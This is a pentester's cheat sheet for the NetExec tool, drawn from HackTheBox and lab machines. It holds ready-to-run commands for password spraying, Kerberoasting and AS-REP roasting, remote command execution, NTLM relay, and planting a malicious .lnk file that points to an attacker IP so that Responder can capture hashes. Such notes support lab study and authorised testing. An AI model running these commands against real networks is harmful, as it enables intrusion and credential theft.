---
title: nxc
author: amandaguglieri  
draft: false  
TableOfContents: true  
tags:
- factive directory
---


# Nxc



Generate the krb5.conf file:

```bash
netexec smb 10.10.100.152 -u Eric.Wallows -p 'EricLikesRunning800'  --generate-krb5-file krb5.conf

```

Example from "HackTheBox machine The Frizz".


## Installation

```bash
# Install within you pyenv environment, in my case tooling
pyenv activate tooling
pip install git+https://github.com/Pennyw0rth/NetExec.git    

# Once installed, remember to remove cache locations for commands
hash -r

# and now it's ready to be used within your env
```

## Basic commands

**Why using an env version of the netExec???** I've notice that some features of the preinstalled version of netExec in kali don't work properly. For instance, creating a TGT the tag --generate-tgt is not recognized.

```bash
####
# Generate TGT
netexec smb ip -u user -p password --generate-tgt /path

export KRB5CCNAME=/path

# use TGT
netexec smb ip -u user -k --use-kcache


######
# Generate krb5.conf file
netexec smb ip -u user -p password --generate-krb5-file /path
export KRB5_CONFIG=/path
# example: netexec smb 10.10.100.152 -u Eric.Wallows -p 'EricLikesRunning800'  --generate-krb5-file krb5.conf

### 
# Execute commands
netexec smb ip -d corp.com -u user -p password  -x "type c:\Users\Administrator\Desktop\flag.txt"
 
#### 
# List the shares
netexec smb ip -d corp.com -u user -p password  --shares 
 

####
# 
nxc winrm 10.10.100.154 -u users.txt  -p 'hghgib6vHT3bVWf' -t 100 --continue-on-success --local-auth




nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' --asreproast output.txt

nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' --kerberoast output.txt

nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' --active-users   

nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' -k --get-sid 
Domain SID S-1-5-21-1969309164-1513403977-1686805993



####################
# mysql
###################
nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv'  

# Enumerate the database commnands
nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -q 'SELECT name FROM master.dbo.sysdatabases;'

# Find Linked Servers: The enum_links module queries the database to enumerate configured MSSQL linked servers.
nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p "TI0LKcfHzZw1Vv" -M enum_links

# Execute a MSSQL query specified in the COMMAND argument on the linked server specified in LINKED_SERVER.
nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p "TI0LKcfHzZw1Vv"  -M exec_on_link -o LINKED_SERVER=SQL07 COMMAND='select @@servername'


```





## NTLM relay

```
└─$ nxc smb 192.168.245.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list IPs/allIPs.txt 


nxc smb 192.168.245.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.182 NAME=README

impacket-ntlmrelayx --no-http-server -smb2support -tf IPs/allIPs.txt 

```



## .lnk File Attack: Capturing Hashes with a Malicious .lnk File PART 2, generated with -M slinky 

If a share has READ/WRITE access, then you can create a malicious.lnk by using the slinky module:

```
nxc smb $ip 0 -d nara-security.com -u 'guest' -p '' -M slinky -o NAME=malicious SERVER='192.168.45.172'

# Server is the attacker IP
```

Just have ready the responder to capture hashes:

```
sudo responder -w -d -I tun0
```

